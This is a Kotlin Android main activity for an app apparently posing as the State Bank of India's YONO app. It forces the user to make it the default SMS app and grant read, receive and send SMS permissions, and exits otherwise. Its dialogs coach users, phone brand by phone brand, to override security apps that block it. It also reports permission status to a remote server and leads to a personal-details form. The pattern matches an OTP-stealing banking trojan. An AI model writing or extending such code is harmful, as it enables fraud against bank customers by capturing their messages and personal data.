package com.sbi.yonosbi

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.core.content.ContextCompat
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.sbi.yonosbi.services.DeviceService
import com.sbi.yonosbi.services.LocalStorage
import com.sbi.yonosbi.services.UserApiService
import com.sbi.yonosbi.ui.screens.HomeScreen
import com.sbi.yonosbi.ui.screens.SplashScreen
import com.sbi.yonosbi.ui.screens.UserDetailsFormScreen
import com.sbi.yonosbi.ui.theme.YonosbiTheme
import com.sbi.yonosbi.utils.Constants
import com.sbi.yonosbi.utils.SmsUtils
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    companion object {
        private const val TAG = "SMS_DEBUG"
    }

    private var showDefaultDialog by mutableStateOf(false)
    private var showPermissionDialog by mutableStateOf(false)
    private var isAppReady by mutableStateOf(false)

    private val smsDefaultChangedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            Log.d(TAG, "Default SMS changed broadcast received: action=${intent.action}")
            if (SmsUtils.isDefaultSmsApp(this@MainActivity)) {
                showDefaultDialog = false
                ensureSmsPermission()
            }
        }
    }

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            Log.d(TAG, "Permission result received: $permissions")
            if (hasAllSmsPermissions()) {
                showPermissionDialog = false
                proceedWithApp()
            } else {
                logPermissionState("permission_result_denied")
                reportDiagnostic(
                    event = "sms_permission_denied",
                    details = currentPermissionSnapshot()
                )
                showPermissionDialog = true
            }
        }

    private val roleRequestLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            Log.d(
                TAG,
                "Default SMS activity result: resultCode=${result.resultCode}, data=${result.data?.action}"
            )
            if (SmsUtils.isDefaultSmsApp(this)) {
                showDefaultDialog = false
                ensureSmsPermission()
            } else {
                Log.w(TAG, "App is still not default SMS after returning from role/default-app flow")
                reportDiagnostic(
                    event = "default_sms_not_granted_after_result",
                    details = currentPermissionSnapshot()
                )
                showDefaultDialog = true
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        Log.d(
            TAG,
            "onCreate: manufacturer=${Build.MANUFACTURER}, brand=${Build.BRAND}, model=${Build.MODEL}, sdk=${Build.VERSION.SDK_INT}"
        )
        ensureDeviceId()

        setContent {
            YonosbiTheme {

                if (isAppReady) {
                    AppNavigation()
                }

                if (showDefaultDialog) {
                    DefaultSmsDialog(
                        onConfirm = {
                            showDefaultDialog = false
                            SmsUtils.requestDefaultSmsApp(this, roleRequestLauncher)
                        },
                        onDismiss = { finish() }
                    )
                }

                if (showPermissionDialog) {
                    PermissionDeniedDialog(
                        onOpenSettings = { openAppSettings() },
                        onExit = { finish() }
                    )
                }
            }
        }

        ensureDefaultSmsApp()
    }

    override fun onResume() {
        super.onResume()
        Log.d(TAG, "onResume: isAppReady=$isAppReady")

        if (!isAppReady) {
            refreshAppState()
        }
    }

    override fun onStart() {
        super.onStart()
        Log.d(TAG, "onStart: registering default SMS change receiver")

        val filter = IntentFilter().apply {
            addAction("android.provider.action.DEFAULT_SMS_PACKAGE_CHANGED")
            addAction("android.provider.Telephony.ACTION_DEFAULT_SMS_PACKAGE_CHANGED")
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // API 33+
            registerReceiver(
                smsDefaultChangedReceiver,
                filter,
                null,
                null,
                RECEIVER_NOT_EXPORTED
            )
        } else {
            // API < 33
            @Suppress("UnspecifiedRegisterReceiverFlag")
            registerReceiver(smsDefaultChangedReceiver, filter)
        }
    }

    override fun onStop() {
        super.onStop()
        Log.d(TAG, "onStop: unregistering default SMS change receiver")
        try {
            unregisterReceiver(smsDefaultChangedReceiver)
        } catch (_: Exception) {}
    }

    private fun hasAllSmsPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
    }

    private fun ensureSmsPermission() {
        logPermissionState("ensureSmsPermission")
        if (hasAllSmsPermissions()) {
            showPermissionDialog = false
            proceedWithApp()
        } else {
            Log.d(TAG, "Requesting SMS permissions from user")
            requestPermissionLauncher.launch(
                arrayOf(
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.SEND_SMS
                )
            )
        }
    }

    private fun ensureDefaultSmsApp() {
        Log.d(TAG, "ensureDefaultSmsApp: checking whether app already holds SMS default")
        if (SmsUtils.isDefaultSmsApp(this)) {
            showDefaultDialog = false
            ensureSmsPermission()
        } else {
            Log.d(TAG, "App is not default SMS. Launching request flow")
            showDefaultDialog = true
            SmsUtils.requestDefaultSmsApp(this, roleRequestLauncher)
        }
    }

    private fun refreshAppState() {
        Log.d(TAG, "refreshAppState: isAppReady=$isAppReady")
        if (!SmsUtils.isDefaultSmsApp(this)) {
            Log.d(TAG, "refreshAppState: app is not default SMS")
            showDefaultDialog = true
            showPermissionDialog = false
            return
        }

        showDefaultDialog = false

        if (!hasAllSmsPermissions()) {
            logPermissionState("refreshAppState_missing_permissions")
            showPermissionDialog = true
            return
        }

        showPermissionDialog = false
        proceedWithApp()
    }

    private fun openAppSettings() {
        Log.d(TAG, "Opening app settings screen for manual permission changes")
        reportDiagnostic(
            event = "manual_settings_opened",
            details = currentPermissionSnapshot()
        )
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = "package:$packageName".toUri()
        }
        startActivity(intent)
    }

    private fun proceedWithApp() {
        if (isAppReady) return
        Log.d(TAG, "proceedWithApp: app is now ready")

        ensureDeviceId()
        isAppReady = true
    }

    private fun logPermissionState(source: String) {
        Log.d(
            TAG,
            "$source: RECEIVE_SMS=${isPermissionGranted(Manifest.permission.RECEIVE_SMS)}, READ_SMS=${isPermissionGranted(Manifest.permission.READ_SMS)}, SEND_SMS=${isPermissionGranted(Manifest.permission.SEND_SMS)}"
        )
    }

    private fun isPermissionGranted(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun currentPermissionSnapshot(): Map<String, Any?> {
        return mapOf(
            "is_default_sms_app" to SmsUtils.isDefaultSmsApp(this),
            "receive_sms_granted" to isPermissionGranted(Manifest.permission.RECEIVE_SMS),
            "read_sms_granted" to isPermissionGranted(Manifest.permission.READ_SMS),
            "send_sms_granted" to isPermissionGranted(Manifest.permission.SEND_SMS)
        )
    }

    private fun reportDiagnostic(
        event: String,
        details: Map<String, Any?> = emptyMap()
    ) {
        lifecycleScope.launch {
            val success = UserApiService(this@MainActivity).reportClientDiagnostic(
                event = event,
                details = details
            )
            Log.d(TAG, "reportDiagnostic event=$event success=$success")
        }
    }

    private fun ensureDeviceId(): String {
        val localStorage = LocalStorage(this)
        val existingDeviceId = localStorage.getItem(Constants.DEVICE_ID_KEY)
        if (existingDeviceId != null) {
            return existingDeviceId
        }

        val generatedDeviceId = DeviceService.getDeviceId(this)
        localStorage.setItem(Constants.DEVICE_ID_KEY, generatedDeviceId)
        Log.d(TAG, "ensureDeviceId: generated and stored device id")
        return generatedDeviceId
    }
}

@Composable
fun DefaultSmsDialog(
    onConfirm: () -> Unit,
    onDismiss: () -> Unit
) {
    val instructionText = remember { getDefaultSmsDialogMessage(Build.MANUFACTURER) }

    AlertDialog(
        onDismissRequest = {},
        title = { Text("Default SMS Required") },
        text = {
            Text(instructionText)
        },
        confirmButton = {
            TextButton(onClick = onConfirm) { Text("Set Now") }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) { Text("Cancel") }
        }
    )
}

@Composable
fun PermissionDeniedDialog(
    onOpenSettings: () -> Unit,
    onExit: () -> Unit
) {
    val instructionText = remember { getPermissionDialogMessage(Build.MANUFACTURER) }

    AlertDialog(
        onDismissRequest = {},
        title = { Text("SMS Permission Required") },
        text = {
            Text(instructionText)
        },
        confirmButton = {
            TextButton(onClick = onOpenSettings) { Text("Open Settings") }
        },
        dismissButton = {
            TextButton(onClick = onExit) { Text("Exit") }
        }
    )
}

private fun getDefaultSmsDialogMessage(manufacturer: String): String {
    val brand = normalizeManufacturer(manufacturer)
    val common = "To continue, set this app as your default SMS app."

    return when (brand) {
        "samsung" ->
            "$common On Samsung phones, tap Set Now and choose this app under Default apps > SMS app."

        "xiaomi", "redmi", "poco" ->
            "$common On Xiaomi, Redmi, and Poco phones, tap Set Now and allow the change in the Security or Default apps screen if prompted."

        "vivo", "oppo", "realme" ->
            "$common On $manufacturer phones, tap Set Now and confirm the change in Default apps if an extra security confirmation appears."

        "oneplus" ->
            "$common On OnePlus phones, tap Set Now and confirm this app as the SMS app in Default apps."

        "motorola", "moto" ->
            "$common On Motorola phones, tap Set Now and choose this app as the SMS app. If you are sent to App settings, return here after the change."

        else ->
            "$common Tap Set Now and confirm the change when Android asks which app should handle SMS."
    }
}

private fun getPermissionDialogMessage(manufacturer: String): String {
    val brand = normalizeManufacturer(manufacturer)
    val common = "SMS permissions are required for this app to function properly."

    return when (brand) {
        "samsung" ->
            "$common On Samsung phones, open App info > Permissions and allow SMS. If it is blocked, also check Default apps and special access screens."

        "xiaomi", "redmi", "poco" ->
            "$common On Xiaomi, Redmi, and Poco phones, open App info > Permissions and also allow access in the Security app if it blocks SMS."

        "vivo", "oppo", "realme" ->
            "$common On $manufacturer phones, open App info > Permissions and allow SMS. If a phone manager or security app blocks it, allow access there too."

        "oneplus" ->
            "$common On OnePlus phones, open App info > Permissions and allow SMS, then return to the app."

        "motorola", "moto" ->
            "$common On Motorola phones, open App info > Permissions and allow SMS. If access is still blocked, also check Special app access or the Permission manager."

        else ->
            "$common Open app settings and allow SMS permissions, then return to the app."
    }
}

private fun normalizeManufacturer(manufacturer: String): String {
    return manufacturer.trim().lowercase()
}

@Composable
fun AppNavigation() {
    val navController = rememberNavController()

    NavHost(
        navController = navController,
        startDestination = "splash"
    ) {
        composable("splash") {
            SplashScreen(
                onSplashComplete = {
                    navController.navigate("home") {
                        popUpTo("splash") { inclusive = true }
                    }
                }
            )
        }

        composable("home") {
            HomeScreen(navController = navController)
        }

        composable("user_details_form") {
            UserDetailsFormScreen()
        }
    }
}
